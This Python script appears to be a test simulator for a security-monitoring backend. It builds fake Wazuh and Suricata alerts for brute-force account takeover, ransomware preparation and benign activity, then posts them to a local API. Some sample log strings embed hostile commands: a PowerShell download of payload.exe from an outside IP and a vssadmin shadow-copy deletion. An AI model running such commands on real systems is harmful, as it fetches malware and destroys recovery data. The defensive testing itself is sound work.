#!/usr/bin/env python3
"""
CyberWatch Attack Simulator
Generates realistic multi-stage Wazuh-format alerts and POSTs them to the backend.
Usage:
  python attack_simulator.py --scenario 1
  python attack_simulator.py --scenario all --delay 0.5
  python attack_simulator.py --scenario 2 --backend-url http://localhost:8000
"""
import argparse
import json
import os
import sys
import time
import uuid
from datetime import datetime, timezone
from typing import List, Dict, Any

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# ANSI colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def make_alert(
    agent_name: str,
    agent_ip: str,
    agent_id: str,
    rule_id: str,
    rule_level: int,
    rule_description: str,
    mitre_id: str = "",
    mitre_tactic: str = "",
    mitre_technique: str = "",
    src_ip: str = "",
    dst_port: int = 22,
    user: str = "",
    raw_log: str = "",
    source: str = "wazuh",
) -> Dict[str, Any]:
    return {
        "alert_id": f"wazuh-{str(uuid.uuid4())}",
        "source": source,
        "timestamp": now_iso(),
        "agent": {
            "id": agent_id,
            "name": agent_name,
            "ip": agent_ip,
        },
        "rule": {
            "id": rule_id,
            "level": rule_level,
            "description": rule_description,
            "mitre": {
                "id": [mitre_id] if mitre_id else [],
                "tactic": [mitre_tactic] if mitre_tactic else [],
                "technique": [mitre_technique] if mitre_technique else [],
            },
        },
        "data": {
            "src_ip": src_ip or None,
            "dst_port": dst_port,
            "user": user or None,
        },
        "raw_log": raw_log or f"Generated alert: {rule_description}",
    }


def post_alert(alert: Dict[str, Any], backend_url: str) -> bool:
    if not REQUESTS_AVAILABLE:
        print(f"{YELLOW}[OFFLINE] requests not available. Alert saved to offline buffer.{RESET}")
        return False
    try:
        resp = requests.post(f"{backend_url}/api/v1/alerts/ingest", json=alert, timeout=10)
        if resp.status_code in (200, 201):
            print(f"{GREEN}✓ POSTed alert {alert['alert_id'][:20]}... → incident_id: {resp.json().get('incident_id', 'none')}{RESET}")
            return True
        else:
            print(f"{RED}✗ HTTP {resp.status_code}: {resp.text[:100]}{RESET}")
            return False
    except Exception as e:
        print(f"{RED}✗ Connection error: {e}{RESET}")
        return False


def send_alerts(alerts: List[Dict[str, Any]], backend_url: str, delay: float) -> List[Dict[str, Any]]:
    failed = []
    for i, alert in enumerate(alerts):
        print(f"{CYAN}[{i+1}/{len(alerts)}] {alert['rule']['description']}{RESET}")
        success = post_alert(alert, backend_url)
        if not success:
            failed.append(alert)
        if delay > 0 and i < len(alerts) - 1:
            time.sleep(delay)
    return failed


def scenario_1_account_takeover(delay: float, backend_url: str):
    """Scenario 1: Account Takeover & Data Exfiltration on prod-db-server."""
    print(f"\n{BOLD}{YELLOW}=== SCENARIO 1: Account Takeover & Data Exfiltration ==={RESET}")
    print("Simulating: Brute Force → Successful Login → Sensitive File Access → Data Exfiltration\n")

    AGENT_NAME = "prod-db-server"
    AGENT_IP = "192.168.10.50"
    AGENT_ID = "001"
    SRC_IP = "203.0.113.45"
    USER = "dbadmin"

    alerts = []

    # 15x failed SSH logins
    for i in range(15):
        alerts.append(make_alert(
            agent_name=AGENT_NAME, agent_ip=AGENT_IP, agent_id=AGENT_ID,
            rule_id="5503", rule_level=10,
            rule_description=f"User authentication failure. Attempt {i+1} of 15 for user: {USER}",
            mitre_id="T1110", mitre_tactic="Credential Access", mitre_technique="Brute Force",
            src_ip=SRC_IP, dst_port=22, user=USER,
            raw_log=f"Nov 13 12:00:{i:02d} prod-db-server sshd[1234]: Failed password for {USER} from {SRC_IP} port {54320+i} ssh2"
        ))

    # 1x successful login
    alerts.append(make_alert(
        agent_name=AGENT_NAME, agent_ip=AGENT_IP, agent_id=AGENT_ID,
        rule_id="5501", rule_level=5,
        rule_description=f"User logged in successfully: {USER}",
        mitre_id="T1078", mitre_tactic="Initial Access", mitre_technique="Valid Accounts",
        src_ip=SRC_IP, dst_port=22, user=USER,
        raw_log=f"Nov 13 12:02:15 prod-db-server sshd[1234]: Accepted password for {USER} from {SRC_IP} port 54336 ssh2"
    ))

    # 1x sensitive file read
    alerts.append(make_alert(
        agent_name=AGENT_NAME, agent_ip=AGENT_IP, agent_id=AGENT_ID,
        rule_id="5503", rule_level=12,
        rule_description="Sensitive file accessed: /var/data/customers.db",
        mitre_id="T1005", mitre_tactic="Collection", mitre_technique="Data from Local System",
        src_ip=SRC_IP, dst_port=22, user=USER,
        raw_log=f"Nov 13 12:03:40 prod-db-server audit[5678]: openat /var/data/customers.db by uid={USER}"
    ))

    # 1x large outbound transfer (Suricata)
    alerts.append(make_alert(
        agent_name=AGENT_NAME, agent_ip=AGENT_IP, agent_id=AGENT_ID,
        rule_id="suricata-et-policy-001", rule_level=14,
        rule_description="High-volume outbound data transfer detected (450MB) to external IP",
        mitre_id="T1048", mitre_tactic="Exfiltration", mitre_technique="Exfiltration Over Alternative Protocol",
        src_ip=SRC_IP, dst_port=443, user=USER, source="suricata",
        raw_log=f"Nov 13 12:04:30 suricata[9999]: ALERT ET POLICY Large Data Transfer to external {SRC_IP}:443 bytes=471859200"
    ))

    failed = send_alerts(alerts, backend_url, delay)
    print(f"\n{GREEN}Scenario 1 complete. {len(alerts)-len(failed)}/{len(alerts)} alerts sent.{RESET}")
    return alerts, failed


def scenario_2_ransomware_prep(delay: float, backend_url: str):
    """Scenario 2: Ransomware Preparation on win-workstation-01."""
    print(f"\n{BOLD}{YELLOW}=== SCENARIO 2: Ransomware Preparation ==={RESET}")
    print("Simulating: PowerShell Download → Mass File Modifications → Shadow Copy Deletion\n")

    AGENT_NAME = "win-workstation-01"
    AGENT_IP = "192.168.10.75"
    AGENT_ID = "002"

    alerts = []

    # 1x suspicious PowerShell
    alerts.append(make_alert(
        agent_name=AGENT_NAME, agent_ip=AGENT_IP, agent_id=AGENT_ID,
        rule_id="92201", rule_level=12,
        rule_description="Suspicious PowerShell command: Invoke-WebRequest downloading from internet",
        mitre_id="T1059.001", mitre_tactic="Execution", mitre_technique="Command and Scripting Interpreter: PowerShell",
        src_ip="", dst_port=443, user="SYSTEM",
        raw_log=r"Nov 13 12:10:00 win-workstation-01 Sysmon: PowerShell.exe -Command Invoke-WebRequest -Uri http://198.51.100.99/payload.exe -OutFile C:\Users\Public\payload.exe"
    ))

    # 20x file modifications
    for i in range(20):
        alerts.append(make_alert(
            agent_name=AGENT_NAME, agent_ip=AGENT_IP, agent_id=AGENT_ID,
            rule_id="5903", rule_level=11,
            rule_description=f"Multiple files modified in rapid succession: document_{i+1:03d}.docx → .locked",
            mitre_id="T1486", mitre_tactic="Impact", mitre_technique="Data Encrypted for Impact",
            src_ip="", dst_port=0, user="SYSTEM",
            raw_log=fr"Nov 13 12:10:{i+10:02d} win-workstation-01 Sysmon: FileCreate C:\Users\Public\Documents\document_{i+1:03d}.docx.locked"
        ))

    # 1x shadow copy deletion
    alerts.append(make_alert(
        agent_name=AGENT_NAME, agent_ip=AGENT_IP, agent_id=AGENT_ID,
        rule_id="92300", rule_level=15,
        rule_description="Shadow copy deletion command executed: vssadmin delete shadows /all /quiet",
        mitre_id="T1490", mitre_tactic="Impact", mitre_technique="Inhibit System Recovery",
        src_ip="", dst_port=0, user="SYSTEM",
        raw_log=r"Nov 13 12:12:30 win-workstation-01 Sysmon: Process cmd.exe: vssadmin delete shadows /all /quiet"
    ))

    failed = send_alerts(alerts, backend_url, delay)
    print(f"\n{GREEN}Scenario 2 complete. {len(alerts)-len(failed)}/{len(alerts)} alerts sent.{RESET}")
    return alerts, failed


def scenario_3_benign_noise(delay: float, backend_url: str):
    """Scenario 3: Benign background activity (should not trigger incidents)."""
    print(f"\n{BOLD}{YELLOW}=== SCENARIO 3: Benign Background Activity ==={RESET}")
    print("Simulating: Normal admin SSH, package updates, backup jobs\n")

    AGENT_NAME = "ops-server-01"
    AGENT_IP = "192.168.1.10"
    AGENT_ID = "003"

    alerts = []

    # 3x routine SSH logins
    for i in range(3):
        alerts.append(make_alert(
            agent_name=AGENT_NAME, agent_ip=AGENT_IP, agent_id=AGENT_ID,
            rule_id="5501", rule_level=3,
            rule_description="Routine SSH login for sysadmin from known internal host",
            src_ip="192.168.1.5", dst_port=22, user="sysadmin",
            raw_log=f"Nov 13 09:0{i+1}:00 ops-server-01 sshd[200]: Accepted publickey for sysadmin from 192.168.1.5"
        ))

    # 1x package update
    alerts.append(make_alert(
        agent_name=AGENT_NAME, agent_ip=AGENT_IP, agent_id=AGENT_ID,
        rule_id="2900", rule_level=2,
        rule_description="Package manager update executed: apt-get upgrade",
        raw_log="Nov 13 09:30:00 ops-server-01 dpkg: status installed apt"
    ))

    # 1x daily backup cron
    alerts.append(make_alert(
        agent_name=AGENT_NAME, agent_ip=AGENT_IP, agent_id=AGENT_ID,
        rule_id="2901", rule_level=2,
        rule_description="Daily backup cron job started by root",
        raw_log="Nov 13 09:00:01 ops-server-01 CRON[9999]: (root) CMD (/usr/local/bin/backup.sh)"
    ))

    failed = send_alerts(alerts, backend_url, delay)
    print(f"\n{GREEN}Scenario 3 complete. {len(alerts)-len(failed)}/{len(alerts)} alerts sent.{RESET}")
    return alerts, failed


def save_offline(alerts: List[Dict[str, Any]], path: str):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        json.dump(alerts, f, indent=2)
    print(f"{YELLOW}Saved {len(alerts)} alerts to offline buffer: {path}{RESET}")


def main():
    parser = argparse.ArgumentParser(description="CyberWatch Attack Scenario Simulator")
    parser.add_argument("--scenario", choices=["1", "2", "3", "all"], default="all",
                        help="Which scenario to run (default: all)")
    parser.add_argument("--backend-url", default=os.environ.get("BACKEND_URL", "http://localhost:8000"),
                        help="Backend API base URL")
    parser.add_argument("--delay", type=float, default=float(os.environ.get("SCENARIO_DELAY", "0.5")),
                        help="Delay in seconds between alerts (default: 0.5)")
    args = parser.parse_args()

    print(f"{BOLD}{CYAN}CyberWatch Attack Simulator{RESET}")
    print(f"Backend URL : {args.backend_url}")
    print(f"Scenario    : {args.scenario}")
    print(f"Delay       : {args.delay}s\n")

    all_alerts = []
    all_failed = []
    offline_path = os.path.join(os.path.dirname(__file__), "..", "test_fixtures", "offline_replay.json")

    if args.scenario in ("1", "all"):
        alerts, failed = scenario_1_account_takeover(args.delay, args.backend_url)
        all_alerts.extend(alerts)
        all_failed.extend(failed)

    if args.scenario in ("2", "all"):
        alerts, failed = scenario_2_ransomware_prep(args.delay, args.backend_url)
        all_alerts.extend(alerts)
        all_failed.extend(failed)

    if args.scenario in ("3", "all"):
        alerts, failed = scenario_3_benign_noise(args.delay, args.backend_url)
        all_alerts.extend(alerts)
        all_failed.extend(failed)

    if all_failed:
        save_offline(all_failed, offline_path)

    print(f"\n{BOLD}=== Simulation Summary ==={RESET}")
    print(f"Total alerts generated : {len(all_alerts)}")
    print(f"Successfully POSTed    : {len(all_alerts) - len(all_failed)}")
    print(f"Failed (saved offline) : {len(all_failed)}")


if __name__ == "__main__":
    main()
